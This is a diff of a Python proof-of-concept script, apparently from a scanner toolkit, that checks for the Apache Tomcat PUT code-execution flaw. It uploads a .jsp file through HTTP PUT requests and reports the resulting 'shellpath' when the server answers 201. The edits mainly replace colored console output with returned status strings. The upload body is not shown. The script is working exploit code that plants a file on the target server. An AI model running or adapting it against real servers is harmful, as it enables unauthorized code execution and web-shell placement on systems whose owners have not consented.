@@ -12,8 +12,6 @@ import time
 import hashlib
 import requests
 import datetime
-import warnings
-from termcolor import cprint
 
 class tomcat_put_exec_BaseVerify:
     def __init__(self, url):
@@ -31,11 +29,10 @@ class tomcat_put_exec_BaseVerify:
         try:
             req = requests.put(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if req.status_code == 201:
-                cprint("[+]存在Tomcat代码执行漏洞...(高危)\tpayload: "+vulnurl+"\tshellpath: "+self.url+"/"+md5_str+".jsp", "red")
+                return "[+]存在Tomcat代码执行漏洞...(高危)\tpayload: "+vulnurl+"\tshellpath: "+self.url+"/"+md5_str+".jsp"
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
-
+            pass
         time_stamp = time.mktime(datetime.datetime.now().timetuple())
         m = hashlib.md5(str(time_stamp).encode(encoding='utf-8'))
         md5_str = m.hexdigest()
@@ -43,12 +40,12 @@ class tomcat_put_exec_BaseVerify:
         try:
             req = requests.put(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if req.status_code == 201:
-                cprint("[+]存在Tomcat代码执行漏洞...(高危)\tpayload: "+vulnurl+"\tshellpath: "+self.url+"/"+md5_str+".jsp", "red")
-
+                return "[+]存在Tomcat代码执行漏洞...(高危)\tpayload: "+vulnurl+"\tshellpath: "+self.url+"/"+md5_str+".jsp"
+            else:
+                return "[-]no vuln"
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-] ====>连接超时"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
     testVuln = tomcat_put_exec_BaseVerify(sys.argv[1])
     testVuln.run()
